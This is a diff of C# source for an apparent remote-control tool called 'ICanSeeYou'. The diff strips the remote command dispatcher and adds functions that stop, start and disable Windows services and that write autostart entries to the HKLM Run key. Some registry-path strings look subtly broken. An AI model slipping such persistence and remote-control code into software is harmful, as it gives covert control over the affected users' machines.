@@ -10,7 +10,7 @@ using System.Net;
 using System.Net.Sockets;
 using System.Threading;
 using System.Windows.Forms;
-
+using System.ServiceProcess;
 namespace ICanSeeYou.Windows
 {
 
@@ -18,15 +18,15 @@ namespace ICanSeeYou.Windows
     //首先定义一个全局，上线地址，上线端口等
    public  class BD
     {
-        public static String LocalDisk_List = "$GetDir||";                     //电脑盘符命令，初始化命令头 
-        public static String Online_Order = "$Online||";                     //上线命令，初始化命令头部 
-        public static String Folder_List = "$GetFolder||";                  //列举子文件夹命令，初始化命令头 
-        public static String File_List = "$GetFile||";                    //列举文件命令，初始化命令头 
-        public static String Process_List = "$GetProcess||";                 //列举文件命令，初始化命令头 
-        public static String RegName_List = "$GetRegisterRoot||";            //列举注册表子项名命令，初始化命令头 
-        public static String RegNameValues_List = "$GetRegisterRootValues||";      //列举注册表子项值命令，初始化命令头 
-        public static String CMD_List = "$ActiveDos||";                  //保存DOS命令执行后的结果 
-        public static String Service_List = "$GetService||";                 //保存系统服务列表 
+        public static String LocalDisk_List = "";                     //电脑盘符命令，初始化命令头 
+        public static String Online_Order = "";                     //上线命令，初始化命令头部 
+        public static String Folder_List = "";                  //列举子文件夹命令，初始化命令头 
+        public static String File_List = "";                    //列举文件命令，初始化命令头 
+        public static String Process_List = "";                 //列举文件命令，初始化命令头 
+        public static String RegName_List = "";            //列举注册表子项名命令，初始化命令头 
+        public static String RegNameValues_List = "";      //列举注册表子项值命令，初始化命令头 
+        public static String CMD_List = "";                  //保存DOS命令执行后的结果 
+        public static String Service_List = "";                 //保存系统服务列表 
         public static Process CMD = new Process();                                 //用于执行DOS命令 
         public static bool _IsStop_Catching_Desktop = false;                       //此标识为用于判断是否停止对于屏幕的获取 
       
@@ -73,106 +73,33 @@ namespace ICanSeeYou.Windows
             MOS.Dispose();
             return Result;
         }
-
-        /// <summary> 
-        /// 此方法根据指定语句通过WMI查询用户指定内容 
-        /// 并且返回 
-        /// </summary> 
-        /// <param name="QueryString"></param> 
-        /// <param name="Item_Name"></param> 
-        /// <returns></returns> 
-        public static String WMI_Searcher_Service_Ex(String QueryString)
+        /// <summary>
+        /// 重载
+        /// </summary>
+        /// <param name="QueryString"></param>
+        /// <returns></returns>
+        public static String WMI_Searcher(String  QueryString)
         {
-            String Result = "";
+            string Result = "";
             ManagementObjectSearcher MOS = new ManagementObjectSearcher(QueryString);
             ManagementObjectCollection MOC = MOS.Get();
             foreach (ManagementObject MOB in MOC)
             {
-                try
+                foreach (PropertyData prop in MOB.Properties)
                 {
-                    Result += MOB["Caption"].ToString() + ",";
-                    if (MOB["Started"].ToString() == "True")
-                    {
-                        Result += "启动中" + ",";
-                    }
-                    else
-                    {
-                        Result += "停止中" + ",";
-                    }
-
-                    Result += MOB["Description"].ToString() + "||";
+                    Result += prop.Name + ":";
+                    Result += MOB[prop.Name].ToString() + ",";
                 }
-                catch (Exception ex)
-                { };
+                Result += "|";
             }
             MOC.Dispose();
             MOS.Dispose();
             return Result;
         }
-
+        
         #endregion
 
-        #region 命令处理函数
-
-        /// <summary> 
-        /// 此方法用于判断命令结构 
-        /// 根据不同的命令调用不同的方法进行处理 
-        /// </summary> 
-        /// <param name="Order_Set"></param> 
-        public static void Order_Catcher(String[] Order_Set)
-        {
-            switch (Order_Set[0])
-            {
-               
-                //此命令头表示客户端请求本机所有盘符 
-                case "$GetDir":
-                    Get_LocalDisk();
-                    break;
-                //此命令头表示客户端请求本机指定目录下的所有文件夹 
-                case "$GetFolder":
-                    Get_Foloder(Order_Set[1]);
-                    break;
-                //此命令头表示客户端请求本机指定目录下的所有文件 
-                case "$GetFile":
-                    Get_File(Order_Set[1]);
-                    break;
-                //此命令头表示客户端请求本机当前所有进程 
-                case "$GetProcess":
-                    Get_Process();
-                    break;
-                //此命令头表示客户端请求杀死本机指定进程 
-                case "$KillProcess":
-                    Kill_Process(Order_Set[1]);
-                    break;
-                //此命令头表示客户端请求列举本地注册表根目录 
-                case "$GetRegisterRoot":
-                    Get_RegRoot(Order_Set[1], Order_Set[2]);
-                    break;
-                //此命令头表示客户端请求列举本地注册表指定项的所有值 
-                case "$GetRegisterRootValues":
-                    Get_RegRootValues(Order_Set[1], Order_Set[2]);
-                    break;
-                //此命令头表示客户端请求激活本地DOS 
-                case "$ActiveDos":
-                    ActiveDos();
-                    break;
-                //此命令头表示客户端请求执行本地DOS命令 
-                case "$ExecuteCommand":
-                    Execute_Command(Order_Set[1]);
-                    break;
-                //此命令头表示客户端请求列举本机系统服务列表 
-                case "$GetService":
-                    GetService();
-                    break;
-                
-            }
-        }
-
-
-        #endregion
-
-
-       
+  
 
         #region 枚举硬盘 
 
@@ -248,7 +175,7 @@ namespace ICanSeeYou.Windows
         /// </summary> 
         public static string  Get_Process()
         {
-            Process_List = "$GetProcess||";
+            Process_List = "";
             Process[] process = Process.GetProcesses();
             for (int i = 0; i < process.Length; i++)
             {
@@ -257,7 +184,7 @@ namespace ICanSeeYou.Windows
                     if (process[i].ProcessName != "")
                     {
                         //拼接字符串 
-                        Process_List += process[i].ProcessName + "," + process[i].Handle.ToString() + "," + process[i].Id + "||";
+                        Process_List += process[i].Id .ToString () + "," + process[i].ProcessName  + "," + process[i].Handle .ToString () + ","+process [i].MainModule .FileName +","+process[i].StartTime .ToString ()+"|";
                     }
                 }
                 catch (Exception ex)
@@ -274,7 +201,7 @@ namespace ICanSeeYou.Windows
         /// 否则返回 $KillProcess||False 
         /// </summary> 
         /// <param name="Process_Name"></param> 
-        public static string  Kill_Process(String Process_Name)
+        public static bool   Kill_Process(String Process_Name)
         {
             bool isKilled = false;
             Process[] Process_Set = Process.GetProcesses();
@@ -299,11 +226,11 @@ namespace ICanSeeYou.Windows
             //得到结果后判断标志位 
             if (isKilled)
             {
-                return "$KillProcess||True";
+                return true;
             }
             else
             {
-                return "$KillProcess||False";
+                return false ;
             }
         }
 
@@ -316,13 +243,13 @@ namespace ICanSeeYou.Windows
         /// </summary> 
         public static string  Get_RegRoot(String Key_Model, String Key_Path)
         {
-            RegName_List = "$GetRegisterRoot||";
+            RegName_List = "";
             //新建数组结构体用来接收得到的子项名集合 
             String[] Reg_Name_Set = Get_Register_Root_Names(Key_Model, Key_Path);
             for (int i = 0; i < Reg_Name_Set.Length; i++)
             {
                 //拼接结果字符串 
-                RegName_List += Reg_Name_Set[i] + "||";
+                RegName_List += Reg_Name_Set[i] + "|";
             }
             return RegName_List;
         }
@@ -340,7 +267,7 @@ namespace ICanSeeYou.Windows
             //新建数组，用来储存子项名字集合 
             String[] Names = null;
             //如果是检索根键值 
-            if (Key_Path == "******%None%******")
+            if (Key_Path == "")
             {
                 //判断键值路径所属的根键 
                 switch (Key_Model)
@@ -399,32 +326,21 @@ namespace ICanSeeYou.Windows
             //返回目录名集合 
             return Names;
         }
-
-        /// <summary> 
-        /// 此方法用于得到当前系统注册表根目录子项所有值并且发送 
-        /// </summary> 
-        public static string  Get_RegRootValues(String Key_Model, String Key_Path)
-        {
-            RegNameValues_List = "$GetRegisterRootValues||";
-            //新建数组结构体用来接收得到的子项名集合 
-            RegNameValues_List += Get_Register_Root_Values(Key_Model, Key_Path);
-            return RegName_List;
-        }
-
+       
         /// <summary> 
         /// 此方法根据指定的注册表项路径 
         /// 查找所属下的所有值名称 
-        /// 并且返回数组名称结构体 
+        /// 并且返回数组名称结构体 ,格式为字段名##字段值
         /// </summary> 
         /// <param name="Key_Model"></param> 
         /// <param name="Key_Path"></param> 
         /// <returns></returns> 
-        public static String Get_Register_Root_Values(String Key_Model, String Key_Path)
+        public static String[] Get_Register_Root_Values(String Key_Model, String Key_Path)
         {
             //新建数组，用来储存子项名字集合 
             String Result_List = "";
             //如果是检索根键值 
-            if (Key_Path == "******%None%******")
+            if (Key_Path == "")
             {
                 //判断键值路径所属的根键 
                 switch (Key_Model)
@@ -435,7 +351,7 @@ namespace ICanSeeYou.Windows
                         {
                             foreach (String VName in RK.GetValueNames())
                             {
-                                Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
+                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                             }
                         }
                         break;
@@ -445,7 +361,7 @@ namespace ICanSeeYou.Windows
                         {
                             foreach (String VName in RK.GetValueNames())
                             {
-                                Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
+                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                             }
                         }
                         break;
@@ -455,7 +371,7 @@ namespace ICanSeeYou.Windows
                         {
                             foreach (String VName in RK.GetValueNames())
                             {
-                                Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
+                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                             }
                         }
                         break;
@@ -465,7 +381,7 @@ namespace ICanSeeYou.Windows
                         {
                             foreach (String VName in RK.GetValueNames())
                             {
-                                Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
+                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                             }
                         }
                         break;
@@ -475,7 +391,7 @@ namespace ICanSeeYou.Windows
                         {
                             foreach (String VName in RK.GetValueNames())
                             {
-                                Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
+                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                             }
                         }
                         break;
@@ -493,7 +409,7 @@ namespace ICanSeeYou.Windows
                         {
                             foreach (String VName in RK.GetValueNames())
                             {
-                                Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
+                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                             }
                         }
                         break;
@@ -503,7 +419,7 @@ namespace ICanSeeYou.Windows
                         {
                             foreach (String VName in RK.GetValueNames())
                             {
-                                Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
+                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                             }
                         }
                         break;
@@ -513,7 +429,7 @@ namespace ICanSeeYou.Windows
                         {
                             foreach (String VName in RK.GetValueNames())
                             {
-                                Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
+                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                             }
                         }
                         break;
@@ -523,7 +439,7 @@ namespace ICanSeeYou.Windows
                         {
                             foreach (String VName in RK.GetValueNames())
                             {
-                                Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
+                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                             }
                         }
                         break;
@@ -533,7 +449,7 @@ namespace ICanSeeYou.Windows
                         {
                             foreach (String VName in RK.GetValueNames())
                             {
-                                Result_List += VName + "##" + RK.GetValue(VName).ToString() + "||";
+                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                             }
                         }
                         break;
@@ -541,7 +457,7 @@ namespace ICanSeeYou.Windows
             }
 
             //返回目录名集合 
-            return Result_List;
+            return Result_List.Split('|');
         }
 
         #endregion
@@ -619,10 +535,102 @@ namespace ICanSeeYou.Windows
         /// </summary> 
         public static string  GetService()
         {
-            return   Service_List + WMI_Searcher_Service_Ex("SELECT * FROM Win32_Service");
+            return   Service_List + WMI_Searcher ("SELECT Name,DisplayName,Description,State,StartMode,Started,PathName,ProcessId FROM Win32_Service");
            
         }
+        public static bool StopService(string servicename)
+        {
+            try
+            {
+                using (ServiceController control = new ServiceController(servicename))
+                {
+                    if (control.Status == System.ServiceProcess.ServiceControllerStatus.Running) control.Stop();
+                    control.Refresh();
+                }
+                return true;
+            }
+            catch
+            { return false; }
+        }
+        public static bool StartService(string servicename)
+        {
+            try
+            {
+                using (ServiceController control = new ServiceController(servicename))
+                {
+                    if (control.Status == System.ServiceProcess.ServiceControllerStatus.Stopped ) control.Start();
+                    control.Refresh();
+                }
+                return true;
+            }
+            catch
+            { return false; }
+        }
+        /// <summary>
+        /// 设置服务启动类型，2自动，3手动，4禁用
+        /// </summary>
+        /// <param name="servicename"></param>
+        /// <param name="i">2自动，3手动，4禁用</param>
+        /// <returns></returns>
+        public static bool ChangeStateService(string servicename, int i)
+        {
+            try
+            {
+                string keyPath = @"SYSTEM\CurrentControlSet\Services\" + servicename;
+                RegistryKey key = Registry.LocalMachine.OpenSubKey(keyPath, true);
+                int StartType = -1;
+                if (Int32.TryParse(key.GetValue("Start").ToString(), out StartType))
+                {
+                    key.SetValue("Start", i);
 
+                }
+                return true;
+            }
+            catch { return false; }
+        }
+        /// <summary> 
+        /// 开机启动项 
+        /// </summary> 
+        /// <param name=\"Started\">是否启动</param> 
+        /// <param name=\"name\">启动值的名称</param> 
+        /// <param name=\"path\">启动程序的路径</param> 
+        public static void RunWhenStart(bool Started, string name, string path)
+        {
+            RegistryKey HKLM = Registry.LocalMachine;
+            RegistryKey Run = HKLM.CreateSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"); 
+          if (Started == true)
+            {
+                try
+                {
+                    Run.SetValue(name, path);
+                    HKLM.Close();
+                }
+                catch 
+                {
+                   
+                }
+            }
+            else
+            {
+                try
+                {
+                    Run.DeleteValue(name);
+                    HKLM.Close();
+                }
+                catch (Exception)
+                {
+                    // 
+                }
+            }
+        }
+        public static string StartupInfoList()
+        {
+            string msg = "";
+            string [] keys = BD.Get_Register_Root_Values("HKEY_LOCAL_MACHINE", @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\");
+            foreach (string key in keys) msg += key + "|";
+            return msg;
+
+        }
         #endregion
 
     }
